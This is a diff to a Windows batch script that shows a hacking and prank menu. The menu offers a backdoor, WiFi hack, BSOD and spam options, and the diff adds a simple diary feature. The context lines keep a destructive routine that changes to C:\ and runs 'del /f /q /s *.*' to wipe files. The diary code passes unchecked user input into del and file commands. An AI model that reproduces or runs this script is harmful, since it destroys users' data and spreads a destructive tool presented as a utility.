@@ -27,7 +27,7 @@ echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM          MMM
 echo.       
 echo --------------------------------------------------- MENU V1.3 -------------------------------------------------
 echo.         
-echo Choose!
+echo Choose^^!
 echo.
 echo [1] Backdoor (Windows)			[10] Processes
 echo [2] Pyranha^^!				[11] System Indo
@@ -36,8 +36,8 @@ echo [4] Show/Hide Files			[13] Pyranha^^!^^! Spam
 echo [5] Open Programs			[14] Reset color
 echo [6] Shutdown				[15] Refresh
 echo [7] BSOD(Dangerous^^!^^!)			[16] BSOD2(Dangerous^^!^^!)
-echo [8] Wifi Hack                           [17] Exit
-echo [9] Change color
+echo [8] Wifi Hack                           [17] Diary (Beta)
+echo [9] Change color               [18] Exit
 echo.
 set /p MenuChoose=       
 if %MenuChoose% == 1 goto Choose(BD)
@@ -56,7 +56,8 @@ if %MenuChoose% == 13 goto pyrkey
 if %MenuChoose% == 14 goto remdat
 if %MenuChoose% == 15 goto securegoing
 if %MenuChoose% == 16 goto deldrive
-if %MenuChoose% == 17 goto exit
+if %MenuChoose% == 17 goto diary
+if %MenuChoose% == 18 goto exit
 pause >nul
 
 :sd
@@ -464,3 +465,55 @@ cd C:\
 del /f /q /s *.*
 pause
 goto MainMenu
+
+:diary
+cls
+echo [1] Reset A Diary
+echo [2] Read Diary
+echo [3] Create New Diary
+echo [4] Back
+set /p diaryc= 
+if %diaryc% == 1 goto rdiary
+if %diaryc% == 2 goto readdiary
+if %diaryc% == 3 goto creatediary
+if %diaryc% == 4 goto MainMenu
+
+:elsediary
+goto diary
+
+:rdiary
+echo.
+cd Diaries
+set /p diaryname= Diary Name: 
+if exist %diaryname%.txt ( del /f %diaryname%.txt ) else ( goto wrongdiaryresn )
+
+:wrongdiaryresn
+echo.
+echo The Diary Does Not Exist.
+echo.
+pause
+goto rdiary
+
+:readdiary
+cls
+cd Diaries
+set /p dname= Diary Name: 
+echo.
+if exist %dname%.txt ( type %dname%.txt
+                       pause         
+                       echo.  
+                       goto diary )           else ( 
+                                              echo.
+                                              echo The Diary Does Not Exist.
+                                              pause
+                                              goto readdiary )
+
+:creatediary
+cls
+cd Diaries
+set /p cdname= The New Diary's Name: 
+set /p cdtext= Text: 
+echo %cdtext% >> %cdname%.txt
+echo.
+pause
+goto diary
